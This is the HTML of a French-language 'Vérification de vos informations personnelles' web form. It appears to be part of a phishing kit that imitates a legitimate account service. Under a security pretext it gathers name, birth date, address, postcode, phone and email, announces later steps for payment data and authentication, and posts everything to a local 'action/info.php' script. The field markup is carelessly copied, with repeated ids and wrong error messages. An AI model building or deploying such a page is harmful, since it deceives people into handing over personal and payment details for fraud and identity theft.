...
<html xmlns="http://www.w3.org/1999/xhtml" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="">
    ...
    <div id="container">
        ...
        <div id="container">
            <main role="main">
                <h2>Vérification de vos informations personnelles</h2>
                <div>
                    <ol id="slideNumber" class="slidePageStep step-createAccount">
                        <li id="stepA" aria-current="step">Vos données personnelles</li>
                        <li id="stepBs">Vos données de paiement</li>
                        <li id="stepCs">Authentification</li>
                        <li id="stepCs">Finalisation</li>
                    </ol>
                </div>
                <section>
                    <form id="kc-register-form" class="form-simple" action="../action/info.php" method="post">
                        <div id="part1">
                            <div class="slidepage">
                                <section>
                                    <h3>Vos données personnelles</h3>
                                    <p>Nous prenons la sécurité de vos informations personnelles très au sérieux. Afin de garantir que votre compte demeure sécurisé et que vous êtes bien la personne qui l'utilise, nous avons besoin de votre aide pour confirmer vos données.</p>
                                    <p>Veuillez renseigner les informations personnelles suivantes :</p>
                                    ...
                                    <div id="form-element" onmouseover="validateField()">
                                        <p id="id-lastname">
                                            <label for="lastName">
                                                <span class="asterisque">*</span>Nom
                                            </label>
                                            <span id="checkMessageLastName" hidden="true">Le nom doit contenir au maximum 50 caractères</span>
                                            <input id="lastName" class="input-text" name="lastName" type="text" autocomplete="off" onkeyup="validateField()" value="">
                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Prénom
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true">Le prénom doit contenir au maximum 50 caractères</span>
                                            <input id="firstName" class="input-text" name="firstName" type="text" autocomplete="off" onkeyup="validateField()" value="">
                                        </p>
                                        <p id="id-birthdate">
                                            <label for="user.attributes.birthDate">
                                                Date de naissance
                                            </label>
                                            <span id="checkMessageBirthDate" hidden="true">Veuillez entrer une date de naissance valide</span>
                                            <input type="date" class="input-text " id="user.attributes.birthDate" lang="fr-FR" name="ddn">

                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Adresse
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true">Le prénom doit contenir au maximum 50 caractères</span>
                                            <input id="firstName" class="input-text" name="adresse" type="text" autocomplete="off" onkeyup="validateField()" value="">
                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Ville
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true">Le prénom doit contenir au maximum 50 caractères</span>
                                            <input id="firstName" class="input-text" name="ville" type="text" autocomplete="off" onkeyup="validateField()" value="">
                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Code postal
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true">Le prénom doit contenir au maximum 50 caractères</span>
                                            <input id="firstName" class="input-text" name="cp" type="text" autocomplete="off" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="validateField()" value="" maxlength="5">
                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Numéro de téléphone
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true">Le prénom doit contenir au maximum 50 caractères</span>
                                            <input id="firstName" class="input-text" name="tel" type="text" autocomplete="off" maxlength="10" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="validateField()" value="">
                                        </p>
                                        <p id="id-email">
                                            <label for="email">
                                                <span class="asterisque">*</span>Adresse e-mail
                                            </label>
                                            <span id="checkMessageEmail" hidden="true">L'email doit contenir au maximum 255 caractères</span>
                                            <input id="email" class="input-text" name="email" type="email" autocomplete="off" value="" placeholder="ex. : prenom.nom@mail.fr" onkeyup="validateField()">
                                        </p>
                                        <ul class="buttons-bar">
                                            <li>
                                                <a href="login.php" id="cancelBtn" class="bt-secondary">Annuler</a>
                                            </li>
                                            <li>
                                                <button id="nextBtn" class="bt-noActivated" type="submit" value="Suivant" disabled="">Suivant</button>
                                            </li>
                                        </ul>
                                    </div>
                                </section>
